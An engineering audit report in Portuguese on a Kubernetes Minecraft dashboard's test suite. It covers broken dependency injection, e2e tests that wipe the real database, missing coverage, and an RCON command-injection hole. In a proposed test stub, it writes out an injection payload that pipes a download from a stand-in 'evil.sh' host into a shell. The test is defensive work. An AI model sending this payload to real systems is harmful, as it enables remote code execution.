# Relatório 01 — Testes e validações do que já foi implementado

> Ver [00-indice.md](00-indice.md) para contexto do ambiente antes de executar qualquer coisa aqui.

## Veredito em uma frase

A suíte de testes é teatro, não proteção: `npm test` **já falha hoje** antes de qualquer
asserção rodar, `npm run test:e2e` apaga o banco de desenvolvimento real a cada execução,
e dos 10 specs unitários só 2 exercitam lógica de negócio de verdade. O código mais
perigoso do backend (o comando RCON vulnerável a RCE) tem zero cobertura.

---

## Parte A — O que está quebrado agora (bloqueadores)

Corrija estes três antes de qualquer outra coisa nesta suíte — sem eles nada roda.

### A1. `src/servers/servers.service.spec.ts:9` — DI quebrada

```ts
providers: [ServersService],   // sem PrismaService, sem AppConfigService
```

Mas o construtor real exige os dois:

```ts
constructor(private prisma: PrismaService, private appConfig: AppConfigService)
```

`Test.createTestingModule(...).compile()` lança `UnknownDependenciesException`. Corrija
adicionando os dois como providers mockados:

```ts
import { Test, TestingModule } from '@nestjs/testing';
import { AppConfigService } from '../app-config/app-config.service';
import { PrismaService } from '../prisma/prisma.service';
import { ServersService } from './servers.service';

describe('ServersService', () => {
	let service: ServersService;

	beforeEach(async () => {
		const module: TestingModule = await Test.createTestingModule({
			providers: [
				ServersService,
				{ provide: PrismaService, useValue: {} },
				{
					provide: AppConfigService,
					useValue: { baseDomain: 'mine.test', cfApiKey: '' },
				},
			],
		}).compile();

		service = module.get<ServersService>(ServersService);
	});

	it('should be defined', () => {
		expect(service).toBeDefined();
	});
});
```

O mock de `@kubernetes/client-node` (`src/__mocks__/@kubernetes/client-node.js`) já cobre
a instanciação do `KubeConfig` no construtor — não precisa mexer nele para este teste
trivial passar. Vai precisar de mais para os testes de comportamento real (ver Parte C).

### A2. `test/admin.e2e-spec.ts:23` — módulo global não entra no grafo

```ts
imports: [AdminModule, GatewayModule],
```

`AppConfigModule` é `@Global()`, mas global só vale se o módulo **entrar no grafo de
compilação** — e ele só é importado em `src/app.module.ts`. Como este e2e não importa
`AppModule`, `AppConfigService` nunca é registrado, e `PrismaService` (que o exige no
construtor) e `GatewayService` não resolvem. Os 3 testes falham no `beforeAll`.

Correção — uma linha:

```ts
import { AppConfigModule } from '../src/app-config/app-config.module';
// ...
imports: [AppConfigModule, AdminModule, GatewayModule],
```

### A3. e2e apagam o `dev.db` real

`test/admin.e2e-spec.ts:38-42`:

```ts
beforeEach(async () => {
	await prisma.serverGroup.deleteMany();
	await prisma.userGroup.deleteMany();
	await prisma.group.deleteMany();
	await prisma.server.deleteMany();
	await prisma.user.deleteMany();
});
```

`PrismaService` (`src/prisma/prisma.service.ts:9-14`) abre o arquivo apontado por
`DATABASE_URL` diretamente com `better-sqlite3` — **não há mock de Prisma em nenhuma
config de teste**. Como `DATABASE_URL` não está em nenhum `.env.test`, os e2e abrem
o `dev.db` de desenvolvimento de verdade e o zeram a cada execução.

Correção: isolar o banco de teste sem introduzir dependência nova (`dotenv-cli` etc.),
usando o fato de que `dotenv` (usado por `@nestjs/config`) **não sobrescreve** variáveis
já setadas em `process.env`.

1. Criar `test/jest-e2e.setup.js`:
   ```js
   // Roda antes do NestJS carregar o ConfigModule. dotenv não sobrescreve env vars
   // já setadas, então isto garante que os e2e nunca abram o dev.db real.
   process.env.DATABASE_URL = 'file:./test.db';
   ```
2. Registrar em `test/jest-e2e.json`:
   ```json
   "setupFiles": ["<rootDir>/jest-e2e.setup.js"],
   ```
3. Adicionar script `pretest:e2e` em `package.json` para migrar o schema no banco de
   teste antes de cada execução (usa a migration já existente em
   `prisma/migrations/20260619113138_init/`):
   ```json
   "pretest:e2e": "DATABASE_URL=file:./test.db npx prisma migrate deploy",
   ```
4. `test.db`/`test.db-journal` já caem no padrão `*.db`/`*.db-journal` do `.gitignore`
   raiz — não precisa de entrada nova, mas confirme que não fica commitado por acidente
   (o `.gitignore` raiz cobre `dashboard/backend/`, então deveria funcionar).

Depois disso, rode `npm test` e `npm run test:e2e` (dentro de `dashboard/backend/`) e
confirme que ambos terminam verdes antes de seguir para a Parte B.

---

## Parte B — Riscos estruturais (corrigir depois dos bloqueadores)

- **`test/modpacks.e2e-spec.ts`** faz chamadas HTTP **reais** a Modrinth/CurseForge —
  flaky por design (depende de rede e de terceiros estarem no ar). Considere mockar
  essas chamadas ou mover para um teste de integração separado, fora do `test:e2e` padrão.
- **`TAILSCALE_API_TOKEN` é obrigatório** (`src/app-config/app-config.schema.ts:14`,
  `Joi.string().required()` — o único campo sem `.default(...)`). `.env` está no
  `.gitignore`, então **em qualquer clone limpo ou CI, todo e2e que importe `AppModule`
  ou `AppConfigModule` falha na validação do Joi antes de rodar qualquer teste.** Se este
  projeto algum dia ganhar CI, isso precisa de um `.env.test` versionado com valores
  fake (token dummy, não o real).
- **`ScheduleModule.forRoot()` + `@Cron` do `SleepModeService`** (`sleep-mode.service.ts:38`,
  `EVERY_5_MINUTES`) fica ativo em qualquer teste que carregue `AppModule` inteiro
  (`test/app.e2e-spec.ts`), sem guard de ambiente de teste e sem `app.close()` no
  `afterEach`/`afterAll` desse arquivo especificamente. Tende a gerar timers pendurados
  ("Jest did not exit", processo trava até timeout). Adicione `afterEach(() => app.close())`
  em `test/app.e2e-spec.ts`.
- **`src/tmp_agents/`** é código morto (nunca importado em `app.module.ts` — confirme com
  `grep -rn "tmp_agents" --include='*.ts' src | grep -v '^src/tmp_agents'`, deve retornar
  vazio). Mesmo assim, `rootDir: "src"` + `testRegex` no `jest` do `package.json` coleta
  os 3 specs de lá (`tmp_agents/backups`, `tmp_agents/tailscale`, `tmp_agents/filemanager`)
  e eles **inflam artificialmente a sensação de cobertura** — são, ironicamente, os
  testes mais bem escritos do repo, mas testam código que não roda em produção. Ao
  decidir o que fazer com `tmp_agents/` (ver relatório 02, que trata do
  `tailscale-injector.ts` de lá), migre os testes de `tmp_agents/backups/backups.service.spec.ts`
  para `src/backups/` (o serviço real e ativo, hoje sem nenhum teste) antes de apagar a pasta.
- **Sem `coverageThreshold`** em nenhuma config — nada impede a cobertura cair para 0%
  silenciosamente. Considere adicionar um piso mínimo depois que a Parte C abaixo estiver
  implementada, para não regredir.
- **`src/encryption/encryption.service.ts:23`** — a chave AES-256-GCM é derivada de
  `this.config.cfApiKey.padEnd(32, '0').slice(0, 32)`, ou seja, reaproveita a API key do
  CurseForge (que por sua vez tem um fallback hardcoded em `servers.service.ts:104-106`,
  ver relatório 00) como segredo criptográfico. Vale um teste que **documente e force a
  correção** — gerar a chave de um segredo dedicado (`ENCRYPTION_KEY` próprio no
  `AppConfigService`/schema Joi), não reaproveitar uma chave de API externa.

---

## Parte C — Onde a cobertura real está faltando (por ordem de risco)

Hoje, batendo cada spec contra o serviço que ele diz testar:

| Arquivo | Casos reais | Seria pego se a lógica quebrasse? |
|---|---|---|
| `src/servers/servers.service.spec.ts` | 0 (só DI, e estava quebrado) | Não |
| `src/servers/servers.controller.spec.ts` | 0 (providers `useValue: {}`) | Não |
| `src/admin/admin.service.spec.ts` | 0 (`toBeDefined()`, mocks nunca chamados) | Não |
| `src/admin/admin.controller.spec.ts` | 0 (idem) | Não |
| `src/app.controller.spec.ts` | 1 trivial | Marginal |
| `src/modpacks/modpacks.service.spec.ts` | 1 real (mapeia resposta Modrinth) | **Sim** |
| `src/modpacks/modpacks.controller.spec.ts` | 2 reais (delegação + `BadRequestException`) | **Sim** |

Zero specs para: `gateway`, `tailscale`, `src/backups` (o real), `monitoring`,
`sleep-mode`, `encryption`, `join-server`. O `src/__mocks__/@kubernetes/client-node.js`
atual também é insuficiente para testar comportamento — cobre só `listNamespacedPod`,
`readNamespacedPod`, `createNamespacedJob`, `listNamespacedPersistentVolumeClaim` e
`Exec`, faltando toda a superfície de `AppsV1Api` (`createNamespacedDeployment`,
`readNamespacedDeployment`, `replaceNamespacedDeployment`, `deleteNamespacedDeployment`,
`listNamespacedDeployment`) e de `CoreV1Api` (`createNamespacedService`,
`deleteNamespacedService`, `deleteNamespacedPersistentVolumeClaim`,
`listNamespacedService`, `readNamespacedPodLog`) — usadas por `ServersService` inteiro.

### C1. Prioridade máxima — `sendCommand` (o caminho do RCE)

Zero testes cobrem `dashboard/backend/src/servers/servers.service.ts:400-414`. Antes
mesmo de corrigir a vulnerabilidade (fora do escopo deste relatório, ver 00-indice.md),
escreva o teste que **prova** o problema e depois passa a proteger a correção:

```ts
it('rejeita comandos que tentam escapar da shell', async () => {
	// arrange: mockar execAsync/child_process.exec via jest.mock('node:child_process')
	// act: chamar sendCommand com um payload tipo `time set day"; curl evil.sh | sh; #`
	// assert (pré-fix): hoje o teste vai mostrar que o comando bruto chega ao exec()
	// assert (pós-fix): depois de trocar para execFile()/allowlist, o teste garante
	//                    que caracteres de shell nunca chegam a um shell de verdade
});
```

Use o mesmo padrão de sanitização já testável em `listFiles`/`readFile`/`deleteFile`
(regex `[^a-zA-Z0-9_\-./]` + remoção de `..`) como referência de "como isto deveria
ser testado depois de corrigido".

### C2. `GatewayService.checkAuthorization` (autorização de rede)

Coberto em detalhe no [relatório 02](02-tailscale-roteamento-controle-granular.md#fase-6--testes-da-lógica-de-autorização),
porque as correções de Prisma/Tailscale mudam a assinatura interna deste método. Não
duplique o teste aqui — implemente junto com aquele relatório.

### C3. `src/backups/` (o serviço real, não o de `tmp_agents/`)

Sem nenhum teste hoje. `tmp_agents/backups/backups.service.spec.ts` (38 linhas) já é um
bom modelo de como testar — valida spec do Job de K8s, nomes de PVC, volumes montados.
Porte a estrutura desse teste para o serviço real em `src/backups/backups.service.ts`.

### C4. `sleep-mode` — hibernação automática

`sleep-mode.service.ts` não tem teste. É o `@Cron` que decide se um servidor hiberna;
merece cobertura de: label `minekube/hibernate-after-minutes` ausente/`'never'` (nunca
hiberna), contagem de jogadores zerada por N ciclos atinge o threshold, e RCON falhando
não hiberna por engano (o `catch` silencioso em `checkServer` hoje mascara isso — um
teste deixa esse comportamento explícito e intencional, não acidental).

### C5. Frontend Angular

Exatamente **1 spec no projeto inteiro**: `dashboard/frontend/src/app/app.spec.ts`, e
está quebrado — é o scaffold default do `ng new`, testando um `<h1>` que não existe mais
no template real (`app.html` foi reescrito para `app-sidebar` + `router-outlet`).
Zero componente de feature (`core/`, `features/`, `layout/`, `shared/`) tem teste.
Prioridade de cobertura nova, na ordem de risco do produto:
1. `access-control.ts` (gestão de usuários/grupos/Tailscale) — é admin, sem guard,
   qualquer regressão silenciosa aqui é grave.
2. `server-console.ts` (terminal RCON) — maior componente do repo (182 linhas), envia
   comandos livres para o mesmo `sendCommand` vulnerável do backend.
3. `server-files.ts` — tem um code smell documentado (acessa membros `private` do
   `ServersService` via bracket notation em vez de método público) que um teste de
   integração pegaria antes de um refactor quebrar silenciosamente.

Nota: o runner é **Vitest** (`angular.json` usa `@angular/build:unit-test`), não Jest —
não copie configuração de teste do backend, os dois stacks são independentes.

---

## Parte D — Validação ao vivo (não substitui os testes automatizados, mas confirma o que os testes não alcançam)

O cluster k3s deste projeto está rodando de verdade (ver 00-indice.md). Depois de
corrigir a Parte A, valide manualmente contra o cluster real — sem mutar nada:

```bash
export KUBECONFIG=~/.kube/config
kubectl get pods -n default   # confirme o que está de pé hoje antes de mexer
```

No momento desta auditoria: `minekube-api` e `minekube-frontend` estavam em
`ImagePullBackOff` (a imagem `minekube-api:latest` não existe em nenhum registry
acessível — precisa do fluxo `make build-api && make import-api`, que exige `sudo`).
Ou seja, **a dashboard não está rodando no cluster agora** — qualquer validação viva
de endpoints HTTP precisa ser feita rodando o backend localmente
(`npm run start:dev` dentro de `dashboard/backend/`, que usa o `~/.kube/config` do
usuário via `kc.loadFromDefault()`), não contra o pod.
